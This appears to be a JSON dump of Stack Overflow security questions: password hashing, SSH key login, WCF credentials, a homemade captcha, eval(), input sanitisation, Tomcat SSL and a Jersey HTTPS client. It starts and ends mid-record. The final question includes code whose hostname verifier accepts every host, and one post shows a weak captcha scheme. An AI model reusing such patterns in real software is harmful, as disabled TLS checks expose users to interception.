}\n\n    /// &lt;summary&gt;\n    /// Validates a password given a hash of the correct one.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"password\"&gt;The password to check.&lt;/param&gt;\n    /// &lt;param name=\"goodHash\"&gt;A hash of the correct password.&lt;/param&gt;\n    /// &lt;returns&gt;True if the password is correct. False otherwise.&lt;/returns&gt;\n    public static bool ValidatePassword(string password, string goodHash)\n    {\n        // Extract the parameters from the hash\n        char[] delimiter = { ':' };\n        string[] split = goodHash.Split(delimiter);\n        int iterations = Int32.Parse(split[ITERATION_INDEX]);\n        byte[] salt = Convert.FromBase64String(split[SALT_INDEX]);\n        byte[] hash = Convert.FromBase64String(split[PBKDF2_INDEX]);\n\n        byte[] testHash = PBKDF2(password, salt, iterations, hash.Length);\n        return SlowEquals(hash, testHash);\n    }\n\n    /// &lt;summary&gt;\n    /// Compares two byte arrays in length-constant time. This comparison\n    /// method is used so that password hashes cannot be extracted from \n    /// on-line systems using a timing attack and then attacked off-line.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"a\"&gt;The first byte array.&lt;/param&gt;\n    /// &lt;param name=\"b\"&gt;The second byte array.&lt;/param&gt;\n    /// &lt;returns&gt;True if both byte arrays are equal. False otherwise.&lt;/returns&gt;\n    private static bool SlowEquals(byte[] a, byte[] b)\n    {\n        uint diff = (uint)a.Length ^ (uint)b.Length;\n        for (int i = 0; i &lt; a.Length &amp;&amp; i &lt; b.Length; i++)\n            diff |= (uint)(a[i] ^ b[i]);\n        return diff == 0;\n    }\n\n    /// &lt;summary&gt;\n    /// Computes the PBKDF2-SHA1 hash of a password.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"password\"&gt;The password to hash.&lt;/param&gt;\n    /// &lt;param name=\"salt\"&gt;The salt.&lt;/param&gt;\n    /// &lt;param name=\"iterations\"&gt;The PBKDF2 iteration count.&lt;/param&gt;\n    /// &lt;param name=\"outputBytes\"&gt;The length of the hash to generate, in bytes.&lt;/param&gt;\n    /// &lt;returns&gt;A hash of the password.&lt;/returns&gt;\n    private static byte[] PBKDF2(string password, byte[] salt, int iterations, int outputBytes)\n    {\n        Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(password, salt);\n\n        pbkdf2.IterationCount = iterations;\n        return pbkdf2.GetBytes(outputBytes);\n    }\n</code></pre>\n\n<p>If there are ways I can I improve this it would be awesome if you could point out certain codes that I could replace.</p>\n\n<p>The code is from: <a href=\"http://crackstation.net/hashing-security.htm#aspsourcecode\" rel=\"nofollow\">http://crackstation.net/hashing-security.htm#aspsourcecode</a></p>\n\n<p>Sir/Ma'am Thank you++ :D</p>\n"},{"tags":["security","ssh","ssh-keys"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13172607,"title":"How to setup server to accept pem(private RSA key) login w/o password like EC2?","body":"<p>I am manage a group of VM and I need to setup all vm create a ssh tunnel to a specific host A. One way to do this is append public key of each VM to host's authorized_keys, but I guess I have to do the append each time i create a VM. So I am trying to config host A to accept pem or private key login without passowrd, just like EC2, client can use \"ssh -i PEM\" to login host A. \nBut I have tried in vain for hours. I create a rsa public/private key and let VM use the private key to login, no matter what I do, host a still ask for password. Is there anything I missed ? Thanks.</p>\n"},{"tags":["javascript","security","authentication","cross-domain"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13172223,"title":"Client-side Javascript Authentication Scheme","body":"<p>Assume you have 2 servers on 2 separate sub-domains called client.example.com and server.example.com, is it possible to authenticate a user using only client side-javascript on client.example.com (no server-side component) and only server-side code (restful json api only)?</p>\n\n<p>A good practical example of this would be to create a client-side only twitter component that does things like post tweets which require authentication. (Right now twitter will open another window which uses their domain for the browser to send the appropriate cookies with the session_id, but assuming we can change that).</p>\n"},{"tags":["wcf","security","webclient","webhttpbinding"],"answer_count":2,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":7077,"score":3,"question_id":795717,"title":"How do you pass user credentials from WebClient to a WCF REST service?","body":"<p>I am trying to expose a WCT REST service and only users with valid username and password would be able to access it. The username and password are stored in a SQL database. </p>\n\n<p>Here is the service contract:</p>\n\n<pre><code>public interface IDataService\n{\n    [OperationContract]\n    [WebGet(ResponseFormat = WebMessageFormat.Json)]\n    byte[] GetData(double startTime, double endTime);\n}\n</code></pre>\n\n<p>Here is the WCF configuration:</p>\n\n<pre><code>&lt;bindings&gt;\n  &lt;webHttpBinding&gt;\n    &lt;binding name=\"SecureBinding\"&gt;\n      &lt;security mode=\"Transport\"&gt;\n        &lt;transport clientCredentialType=\"Basic\"/&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n  &lt;/webHttpBinding&gt;\n&lt;/bindings&gt;\n&lt;behaviors&gt;\n  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"DataServiceBehavior\"&gt;\n      &lt;serviceMetadata httpGetEnabled=\"true\"/&gt;\n      &lt;serviceCredentials&gt;\n        &lt;userNameAuthentication\n           userNamePasswordValidationMode=\"Custom\"\n           customUserNamePasswordValidatorType=\n                 \"CustomValidator, WCFHost\" /&gt;\n      &lt;/serviceCredentials&gt;\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n&lt;/behaviors&gt;\n&lt;services&gt;\n  &lt;service behaviorConfiguration=\"DataServiceBehavior\" name=\"DataService\"&gt;\n    &lt;endpoint address=\"\" binding=\"webHttpBinding\"\n              bindingConfiguration=\"SecureBinding\" contract=\"IDataService\" /&gt;\n  &lt;/service&gt;\n&lt;/services&gt;\n</code></pre>\n\n<p>I am accessing the service via the WebClient class within a Silverlight application. However, I have not been able to figure out how to pass the user credentials to the service. I tried various values for client.Credentials but none of them seems to trigger the code in my custom validator. I am getting the following error: The underlying connection was closed: An unexpected error occurred on a send.</p>\n\n<p>Here is some sample code I have tried:</p>\n\n<pre><code>   WebClient client = new WebClient();\n   client.Credentials = new NetworkCredential(\"name\", \"password\", \"domain\");\n   client.OpenReadCompleted += new OpenReadCompletedEventHandler(GetData);\n   client.OpenReadAsync(new Uri(uriString));\n</code></pre>\n\n<p>If I set the security mode to None, the whole thing works. I also tried other clientCredentialType values and none of them worked. I also self-hosted the WCF service to eliminate the issues related to IIS trying to authenticate a user before the service gets a chance.</p>\n\n<p>Any comment on what the underlying issues may be would be much appreciated. Thanks.</p>\n\n<p><strong>Update</strong>: Thanks to Mehmet's excellent suggestions. Here is the tracing configuration I had:</p>\n\n<pre><code> &lt;system.diagnostics&gt;\n    &lt;sources&gt;\n      &lt;source name=\"System.ServiceModel\"\n              switchValue=\"Information, ActivityTracing\"\n              propagateActivity=\"true\"&gt;\n        &lt;listeners&gt;\n          &lt;add name=\"xml\" /&gt;\n        &lt;/listeners&gt;\n      &lt;/source&gt;\n      &lt;source name=\"System.IdentityModel\" switchValue=\"Information, \n               ActivityTracing\" propagateActivity=\"true\"&gt;\n        &lt;listeners&gt;\n          &lt;add name=\"xml\" /&gt;\n        &lt;/listeners&gt;\n      &lt;/source&gt;\n    &lt;/sources&gt;\n    &lt;sharedListeners&gt;\n      &lt;add name=\"xml\"\n           type=\"System.Diagnostics.XmlWriterTraceListener\"\n           initializeData=\"c:\\Traces.svclog\" /&gt;\n    &lt;/sharedListeners&gt;\n  &lt;/system.diagnostics&gt;\n</code></pre>\n\n<p>But I did not see any message coming from my Silverlight client. As for https vs http, I used https as follows:</p>\n\n<pre><code>string baseAddress = \"https://localhost:6600/\";\n_webServiceHost = new WebServiceHost(typeof(DataServices), \n                new Uri(baseAddress));\n_webServiceHost.Open();\n</code></pre>\n\n<p>However, I did not configure any SSL certificate. Is this the problem?</p>\n"},{"tags":["security","mobile","jquery-mobile","web","web-development"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13171300,"title":"What Are the standards in mobile web application development?","body":"<p>I am working as a developer of a mobile team. Up to now, we have developed many navite mobile applications on windows mobile and android platforms. Our branch has groved up for the last 2 years and we have not many employees to work with. So we found a solution that covers platform-free application development. So, we will make it possible with a web based mobile application. WCF HTTP services, logging side, database, ssl certificate etc. are ready for this. My questions:</p>\n\n<ol>\n<li>what are the <strong>basics</strong> of a mobile web application for security. </li>\n<li>Is it possible to take mobile browser support that runs <strong>HTML5</strong> on any A-B-C generation mobile phones ? </li>\n<li>jquery libraries for mobile (jquery mobile etc.) are secure enough for this?</li>\n</ol>\n"},{"tags":["c#","winforms","security","cookies","webbrowser-control"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13169955,"title":"How can I stop a webbrowser control from showing cookie security warnings?","body":"<p>I'm using <code>winform</code> <code>webbrowser</code> control and sometimes when closing the application, I get this very annoying Windows Security Warning dialog about allowing cookies on the site. Here is the exact message:</p>\n\n<blockquote>\n  <p>To allow this website to provide information personalized for you,\n  will you allow it to put a small file (called a cookie) on your\n  computer?</p>\n</blockquote>\n\n<p>Now, I know my IE 9 settings has cookies turned on (by navigating my control to www.whatismybrowser.com), so why do I still get this dialog? I would like it to never display, and I thought allowing cookies should be sufficient but maybe the control is doing something else. </p>\n"},{"tags":["php","security","captcha","brute-force"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":101,"score":3,"question_id":13167832,"title":"Home made captcha , is it safe?","body":"<p>I've been gathering information about how to protect from <em>brut force attack</em> on the logging page or from the haressment of <em>multiple account creation.</em></p>\n\n<p>I came to the conclusion (thanks to you guys of Stackoverflow)  that the best way would be to use captchas.</p>\n\n<p>But uneasy to read captchas or accented characters may deter users from using a website.</p>\n\n<p>So, I found out an easy to use little script I adapted to my site. It's a simple math captcha proposing to sum up 2 figures from <em>zero to ten</em>. It displays the words <strong>'one' 'two' 'three'</strong> ... not the figures.  </p>\n\n<p>My questions are :</p>\n\n<p>1) Does this little captcha provide sufficient security in itself ?</p>\n\n<p>2) Is the way I integrated it safe ? ( any way to bypass it ?)</p>\n\n<p><em>To avoid pasting 800 lines of code I've made a summary, I hope it is clear.</em></p>\n\n<p><strong>captcha script :</strong></p>\n\n<pre><code>$n1  = mt_rand(0,10);  \n$n2  = mt_rand(0,10);  \n$fig = array('zero','one','two','three','four','five','six','seven','eight','nine','ten');  \n$result = $n1 + $n2;\n$sentence = $fig[$n1] .' plus '.$fig[$n2];  \n$_SESSION['captcha'] = $result;  \n$captcha_label = \"&lt;label for='captcha' &gt;How much does \".$sentence.\"make?&lt;/label&gt;\";               \necho $captcha_label.\"&lt;/label&gt;&lt;input  type='text' name='captcha'  value=''/&gt;&lt;br /&gt;\";                                 \necho \"&lt;input type='submit' name='create' value='create account'&gt;\"; \n</code></pre>\n\n<p><strong>PAGES:</strong></p>\n\n<ul>\n<li><strong>form.php:</strong></li>\n</ul>\n\n<p>all <em>'create account'</em> input fields + captcha</p>\n\n<p>=> test</p>\n\n<ul>\n<li><p><strong>test.php:</strong></p>\n\n<p><code>if($_POST['captcha'] != $_SESSION['captcha']){<br>\n    $_SESSION['captcha_control'] = \"false\";</code>\n    }  </p></li>\n</ul>\n\n<p>Then all <em>'create account'</em> $_POSTS are injection tested</p>\n\n<p>If any of them or the captcha returns \"false\" , the script deflects to => problem.php</p>\n\n<ul>\n<li><strong>problem.php:</strong></li>\n</ul>\n\n<p>Echoes the initial form with all \"wrong fields\" highlighted \nand a new captcha is displayed, was it right or was it wrong.<br>\nvalidation => back to <strong>test.php</strong></p>\n\n<p>Thanks a lot.</p>\n"},{"tags":["security","tcp-ip"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":49,"score":-2,"question_id":12222521,"title":"TCP IP shortcomings","body":"<p>Before I ask any Q'(s), I understand that:\n1. Transmission Control Protocol (TCP) runs on top of IP,</p>\n\n<ol>\n<li><p>TCP provides guaranteed delivery, and ensures that the packets are delivered in sequence.</p></li>\n<li><p>The underlying network IP, is highly unreliable and does not provide any guarantee for TCP.</p></li>\n<li><p>I'm not an networking pro.</p></li>\n</ol>\n\n<p>I've been reading an interesting detailed Security article by CHRIS CHAMBERS, JUSTIN DOLSKE, and JAYARAMAN IYER on <a href=\"http://www.linuxsecurity.com/resource_files/documentation/tcpip-security.html\" rel=\"nofollow\">TCP IP Security, the basis of today's internet </a>; which unfortunately lack even the most basic mechanisms for security.</p>\n\n<p>I understand that the TCP and IP protocols were designed when the 'Internets' was small, and users generally trusted each other.  In most occasions, the two protocols that are referred to are:\nthe RFC's for IP [RFC 791], and TCP [RFC 793].</p>\n\n<p>As discussed, \"Since the network is dynamic, it is possible that two datagrams from the same source take different paths to make it to the destination\", and  \"IP only tries for a best-effort delivery. It does not take care of lost packets; this is left to the higher layer protocols. There is no state maintained between two datagrams; in other words, IP is connection-less.......\".</p>\n\n<p>Among other many problems,nnone of the IP fields are encrypted and there's no authentication (Note that this is partially fixed in in IP6).</p>\n\n<p>Are there any 'real' fixes for TCP/IP 4 weaknesses?</p>\n"},{"tags":["javascript","security","eval"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":13167403,"title":"Is Javascript eval() so dangerous?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil\">When is JavaScripts eval() not evil?</a>  </p>\n</blockquote>\n\n\n\n<p>I am writing a script in which users have to write in a currency amount, some examples could be (user input >> converts to), with USD as default currency:</p>\n\n<pre><code>50       &gt;&gt; 50.0 USD\n50.5     &gt;&gt; 50.5 USD\n50+1 USD &gt;&gt; 51.0 USD\n50 GBP   &gt;&gt; 50.0 GBP\n</code></pre>\n\n<p>I want to make this as smooth as possible, therefore I want to use JavaScript (it's a web app based on PHP/MySql + JavaScript). I want to use regex to filter the input, run it through <code>eval()</code> and return it.</p>\n\n<p>Is this a bad idea? I've read some topics about <code>eval()</code> being a security issue. I just don't see how. A user can easily run JavaScript anyway?</p>\n\n<p>Keep in mind that I will validate all input server-side with PHP at a later stage.</p>\n"},{"tags":["security","api","application"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":20,"score":0,"question_id":13163132,"title":"How to secure account creation via (private) API?","body":"<p>Some time ago, it was commonplace for smartphone apps to open a browser to a registration page with a CAPTCHA, or to require separate signup via web, because API signup was seen as vulnerable.</p>\n\n<p>Now most apps seem to offer registration via native form, though endpoints for this are usually not documented in their public API. I haven't seen many reports of this being abused to create spam accounts.</p>\n\n<p>How is this done? Is there a standard crypto/handshake process to verify real signups, or does signup typically rely on undocumented endpoints and simple API key passing?</p>\n"},{"tags":["asp.net","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13166703,"title":"Native code-level authorization mechanism?","body":"<p>I'm looking for a native ASP.NET mechanism to keep my apps secure. Right now the business functionality is contained in a business layer and that's where I handle security stuff... Basically whenever I encounter a situation where someone is trying to do something that they can't do, I throw an exception. This exception is not handled on the calling side and a yellow error screen is displayed.</p>\n\n<p>The apps are secure but the yellow screen is a bit lacking in user friendliness.</p>\n\n<p>I already use CAS SSO, Profile Provider and Role Provider together. What I'm looking for is a system for the most granular bit of security, at the code level. Is there a kind of mechanism in ASP.NET to handle this?</p>\n\n<p>For now this is what I have in mind: Find a general place somewhere to handle all security-type exceptions thrown by my business layer and forward the request to an Unauthorized.aspx page to notify the user that something unauthorized was attempted. I'm not too sure where to stick the catch-all though.</p>\n"},{"tags":["ruby-on-rails","facebook","security","facebook-graph-api","facebook-javascript-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13166310,"title":"Building an API backend with Rails 3 and Facebook login","body":"<p>I've a simple application, that requires facebook signup/login built in Rails 3 that works exactly as I want it to.\nMeanwhile, I had several requests to make it behave like an API, the web app is a social media tool where people publish content to their own social networks. i'm converting the system to provide a solution for the following problem:</p>\n\n<ul>\n<li>3rd party website having their own login system</li>\n<li>They want to make a button - publish through X service - and as soon as the user presses the button he will be shown the Facebook Permissions' dialog for my own fb app, as soon as he authorizes it the content will be published</li>\n</ul>\n\n<p>So far, while the webapp was a standalone website, this was really easy to do - they would go to my webapp, login with facebook and published whatever they wanted to, however, I'm finding it hard to come up with a solution that doesn't present any security issues. Here's what I was thinking:</p>\n\n<ul>\n<li>I provide a JS SDK which:\n<ul>\n<li>the 3rd party install in their website -> a special method is associated with a button</li>\n<li>Once the button is pressed, the user is redirected to FB (sets de redirect_ui to be the current page)</li>\n<li>catches the params whenever FB redirects back (as soon as the user gives the permissions)</li>\n<li>Push the content through Facebook and so on</li>\n<li>the 3rd party provides a callback that will run as soon as the content is published (I send them the FB_ID and access token)</li>\n<li>The 3rd party can now make calls to all my API given they will send the FB_ID and access token which I sent as soon as I had the permissions</li>\n</ul></li>\n</ul>\n\n<p>Will this work ? Can I easily catch back the FB redirect ? Are there any security issues ?</p>\n\n<p>Thanks in advance,\nZe</p>\n"},{"tags":["security","maven","ssl","tomcat7"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12448677,"title":"force ssl in tomcat 7","body":"<p>I want to force all users to use SSL for all pages in my application. I am using mavan 3 and used this plugin in maven:</p>\n\n<pre><code>        &lt;plugin&gt;\n            &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt;\n            &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt;\n            &lt;version&gt;2.0-SNAPSHOT&lt;/version&gt;\n            &lt;configuration&gt;\n                &lt;server&gt;TomcatServer&lt;/server&gt;\n                &lt;httpsPort&gt;8443&lt;/httpsPort&gt;\n                &lt;keystoreFile&gt;-- My keystore path --&lt;/keystoreFile&gt;\n                &lt;keystorePass&gt;-- My keystore pass --&lt;/keystorePass&gt;\n                &lt;path&gt;/&lt;/path&gt;\n            &lt;/configuration&gt;\n        &lt;/plugin&gt;\n</code></pre>\n\n<p>On running the server through maven (mvn tomcat7:run), my server logs are like this:</p>\n\n<pre><code>...\nINFO: Initializing Spring root WebApplicationContext\nSep 16, 2012 9:55:17 PM org.apache.coyote.AbstractProtocol start\nINFO: Starting ProtocolHandler [\"http-bio-8080\"]\nSep 16, 2012 9:55:17 PM org.apache.coyote.AbstractProtocol start\nINFO: Starting ProtocolHandler [\"http-bio-8443\"]\n</code></pre>\n\n<p>However, when I access the page with https, I get SSL connection error in chrome and \"SSL received a record that exceeded the maximum permissible length.\" in firefox.</p>\n\n<p>1) I believe maven embeds Tomcat 7 in the war. So, there is no server.xml file where I can manually configure SSL. How can I configure SSL in my pom.xml?</p>\n\n<p>2) How to make sure that all requests get forwarded to 8443?</p>\n"},{"tags":["c#","windows","security","winapi","windows-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12950089,"title":"Why does LogonUser always return error code 1008?","body":"<p>I'm using LogonUserA function to authenticate user in a ASP.NET 4.0 web application that running on IIS7/Win2008. It works well if user enters correct user name and password, but in case user name or password is wrong, LogonUserA always return a same error code 1008 that translate to a vague message \"An attempt was made to reference a token that does not exist\". Of course if LogonUserA failed then there'll be no valid token, so what does this error mean? Is there any specific error code for typical login errors? and how can I get it?</p>\n\n<p>Below is my code:</p>\n\n<pre><code>[DllImport(\"advapi32.dll\", SetLastError = true)]\npublic static extern int LogonUserA(string lpszUserName,\n    string lpszDomain,\n    string lpszPassword,\n    int dwLogonType,\n    int dwLogonProvider,\n    ref IntPtr phToken);\n\nif (0 != LogonUserA(userName, domain, newPassword, Logon32LogonInteractive, Logon32ProviderDefault, ref token))\n{\n    // error is always 1008 if user name of password is incorrect.\n    int error = Marshal.GetLastWin32Error();\n\n    var exception = new Win32Exception(error);\n\n    // What I got in error log for above Win32Exception is:\n    // System.ComponentModel.Win32Exception (0x80004005): An attempt was made to reference a token that does not exist\n}\n</code></pre>\n"},{"tags":["security","authentication","google-authentication"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13164314,"title":"If I use Google authentication for a site, can I tell if the user has 2 step auth?","body":"<p>I want to use Google authentication for a site, but want to enforce use of Google 2 step authentication.  Is there a way for me to tell if a user has this on or not?  I want to boot users who don't use it.</p>\n\n<p>Note that this is for a non-Google site, so I can't use the enforcement capability that Google Apps allows for.</p>\n"},{"tags":["android","security","android-camera","android-camera-intent"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13164261,"title":"Capture full resolution image from camera in a secure way (without storing to disk, if possible)","body":"<p>I am developing an app that will allow users to capture images of secure documents and upload those images to a server (a good example of what I'm trying to do is a banking app that allows users to take pictures of checks.)</p>\n\n<p>For security reasons, I do not want the image physically stored on disk at any point, if possible.</p>\n\n<p>When I try to do this with the MediaStore.ACTION_IMAGE_CAPTURE intent, it works... but the resolution is very low.  I assume this is to prevent overuse of RAM.  I've looked around for solutions, but all of the ones I found involve storing the image on the SD card or internal NAND storage.  I do not want to do that.</p>\n\n<p>If it is not possible to avoid storing the photo, is there a way for the image to be stored to a location only accessible to my app?  I would then delete the file after it's uploaded.  And if I have to do it this way, is there any way to encrypt the photo as it's being stored?</p>\n\n<p>Here's a simplification of my current code, in case that helps at all:</p>\n\n<pre><code>    Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n    startActivityForResult(intent,requestCode);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>protected void onActivityResult(int requestCode, int resultcode, Intent data)\n{\n    if (resultcode == RESULT_OK)\n    {\n        Bitmap bmp = getBitmapFromIntent(data);\n    }\n}\nprivate Bitmap getBitmapFromIntent(Intent intent)\n{\n    Bundle extras = intent.getExtras();\n    return (Bitmap) extras.get(\"data\");\n}\n</code></pre>\n"},{"tags":["security","passwords","trimming"],"answer_count":7,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":341,"score":6,"question_id":7240869,"title":"Should I trim spaces in a password field","body":"<p>Just wondering.</p>\n\n<p>We usually trim a user name in various forms in our ASP.Net application, whats the best practices for password fields.</p>\n\n<p>i.e. should we remove a trailing space in a password  field before being saved/encrypted?</p>\n"},{"tags":["javascript","ajax","security","same-origin-policy"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13161092,"title":"Same origin policy causes Ajax requests to example.com from www.example.com to be denied?","body":"<p>If you visit a website at <a href=\"http://www.example.com/dir\" rel=\"nofollow\">http://www.example.com/dir</a> , then any ajax requests to <a href=\"http://example.com/dir/something.php\" rel=\"nofollow\">http://example.com/dir/something.php</a> (with the www missing) cause the following message to show up in google chrome's console:</p>\n\n<pre><code>XMLHttpRequest cannot load http://example.com/dir/something.php.\nOrigin http://www.example.com is not allowed by Access-Control-Allow-Origin.\n</code></pre>\n\n<p>What's up with this, and what can be done to fix this?</p>\n\n<p>Edit: It seems that any cookies set by example.com also disappear when you visit www.example.com ?</p>\n"},{"tags":["php","mysql","security","xss-prevention","code-injection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13160789,"title":"Securely handling user input in PHP and mySQL","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/129677/whats-the-best-method-for-sanitizing-user-input-with-php\">Whats the best method for sanitizing user input with PHP?</a>  </p>\n</blockquote>\n\n\n\n<p>I know similar questions have been asked multiple times here, and I've spent some time reading all of them, but I am still not confident if my application is going to be secure...</p>\n\n<p>The website I am building allows users to post things into a database, edit their own postings, search for other postings, and display postings from other users. Clearly, there is a whole bunch of user input and form data and what not, which I have to make sure is secure.</p>\n\n<p>So here's how my process currently works:</p>\n\n<ol>\n<li>users input their data into HTML forms, which are converted into $_POST data.</li>\n<li>a posthandler.php file converts all $_POST data into $_SESSION data</li>\n<li>the $_SESSION data is converted into $this-> class variables</li>\n<li>the $this-> class variables are used in the mySQL query and entered into the DB</li>\n<li>from the DB the data is displayed back in HTML.</li>\n</ol>\n\n<p>What measures do I have to take in which of those steps in order to insure the security of my website? (preventing code injection and XSS)</p>\n\n<p>For now this is what I am thinking, please correct me if I am wrong:</p>\n\n<ul>\n<li><p>For 1. I have no control, the data is completely vulnerable.</p></li>\n<li><p>Therefore in 2. I have to check if the data matches certain patterns, which I expect (check if it's numeric, check if it's a date, check if it's letters only, check if it's a value from an array which I provide, use regular expressions, ... ) This way I can prevent for example if I expect a value between 1 and 10, and someone says \"'--DROP table;\" instead that I have already made sure these fields are secure. Of course fields, which are not as restrictive like text boxes where users can type messages are still vulnerable.</p></li>\n<li><p>For step 3. there shouldn't be anything I need to do, if I did everything correct in the step before, right? An attacker shouldn't be able to change the SESSION data or the class variables, unless there is a major security breach on the server side, for which my hosting provider should be responsible, correct? </p></li>\n<li><p>In step 4. where I do my query, I need to escape the data with mysqli_real_escape_string() to make sure the data is not handled as a command.</p></li>\n<li><p>And in step 5. I plan on converting every special character into their respective HTML code snippet. All <code>\"</code> are going to be converted to <code>&amp;quot;</code> for example.</p></li>\n</ul>\n\n<p>Are there any additional security measures /filters I should apply within each step?</p>\n\n<p>What if I make a mistake in step 2.) or I am unable to find a regular expression for a field. I just convert from $_POST to $_SESSION without further validation. Will it save my butt to use mysqli_real_escape_string() during the query and to filter all characters before they are displayed in the browser?</p>\n\n<p>I look forward to your insight! </p>\n"},{"tags":["asp.net-mvc","security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13160311,"title":"MVC4 storing and recalling user password","body":"<p>Current I'm working on an a project using MVC4 in which we have a service reference looking into the Database to return our content.  The service reference requires me to provide the username/password each time I make a call. </p>\n\n<p>What would be best practices for this?  Should I encrypt the password then save it to a cookie or should I issue the user an Auth Token?  Or would there be a third option?</p>\n"},{"tags":["java","security","zip","hidden-files","windows-kernel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":31,"score":-3,"question_id":13158462,"title":"Protection program for files and folders","body":"<p>The project is a security program that locks files and folders using Java<br>\nI have two ideas:</p>\n\n<p>First: Hiding the file or folder in Windows Kernel level<br>\nI cannot find a way to do this at this moment.<br>\nHow can I do this? Are there any helpful tips?  </p>\n\n<p>Another solution: Create a new extension Windows cannot read and close it with a password.<br>\nTransformed the desired file to zip file and then read it as bytes and stored in a file with the new extension I have created.\nHere are two problems: Reading the bytes takes a long time and if the file size is large (larger than 200 MB) it produces an error as the runtime memory is full.  </p>\n\n<p>How do you solve these problems?<br>\nAre there ways to protect files and folders except those two methods??  </p>\n\n<p>*If anything is not clear ask me please.  </p>\n\n<p>thanks for help </p>\n"},{"tags":["security","windows-7","registry"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13158488,"title":"Windows 7 Registry Security","body":"<p>This qyestion has been bugging me for months, but I've found other things to focus on so it has lingered.</p>\n\n<p>I have two Windows 7 machines, seemingly identically configured and yet something is different and I don't know enough about such matters to figure out what the difference is.</p>\n\n<p>We would like to execute the following command line as an administrative user:</p>\n\n<pre><code>regedit /s myspecial.reg\n</code></pre>\n\n<p>and update the registry with these keys.</p>\n\n<p>We find the following:</p>\n\n<p>One one machine, the registry is updated as expected.  On the other machine, although no error message is shown, the registry is not updated.  On both machnines, if entering regedit in interactive mode, we are able to import myspecial.reg.</p>\n\n<p>What security setting is responsible for this difference?</p>\n"},{"tags":["security","client","jersey","realm"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":8938,"score":2,"question_id":3434309,"title":"Accessing secure restful web services using jersey client","body":"<p>I have created web services based on Jersey (auto generated via Netbeans).</p>\n\n<p>I have also created a user names testClient with password secret and created User group Users and used file Realm using glassfish 3.0.1 admin console.</p>\n\n<p>I have also mapped web.xml and sun-web.xml accordingly.</p>\n\n<p>My web services are secured successfully; as I access the web site I receive a security warning and then I am prompt to give username and password to access any content of the website. It is working fine when accessed via web browser.</p>\n\n<p>Now I have written a simple client based on jersey and tried to access the web services offered by the 1st project; the client code is here</p>\n\n<p>Auto generated Jersey client code\n<code>\npublic class JerseyClient {\n    private WebResource webResource;\n    private Client client;\n    private static final String BASE_URI = \"https://localhost:9028/testsecurity2/resources\";</p>\n\n<pre><code>public JerseyClient() {\n    com.sun.jersey.api.client.config.ClientConfig config = new com.sun.jersey.api.client.config.DefaultClientConfig(); // SSL configuration\n    // SSL configuration\n    config.getProperties().put(com.sun.jersey.client.urlconnection.HTTPSProperties.PROPERTY_HTTPS_PROPERTIES, new com.sun.jersey.client.urlconnection.HTTPSProperties(getHostnameVerifier(), getSSLContext()));\n    client = Client.create(config);\n    webResource = client.resource(BASE_URI).path(\"manufacturers\");\n}\n\npublic &lt;T&gt; T get_XML(Class&lt;T&gt; responseType) throws UniformInterfaceException {\n    return webResource.accept(javax.ws.rs.core.MediaType.APPLICATION_XML).get(responseType);\n}\n\npublic &lt;T&gt; T get_JSON(Class&lt;T&gt; responseType) throws UniformInterfaceException {\n    return webResource.accept(javax.ws.rs.core.MediaType.APPLICATION_JSON).get(responseType);\n}\n\npublic void close() {\n    client.destroy();\n}\n\npublic void setUsernamePassword(String username, String password) {\n    client.addFilter(new com.sun.jersey.api.client.filter.HTTPBasicAuthFilter(username, password));\n}\n\nprivate HostnameVerifier getHostnameVerifier() {\n    return new HostnameVerifier() {\n\n        @Override\n        public boolean verify(String hostname, javax.net.ssl.SSLSession sslSession) {\n            return true;\n        }\n    };\n}\n\nprivate SSLContext getSSLContext() {\n    javax.net.ssl.TrustManager x509 = new javax.net.ssl.X509TrustManager() 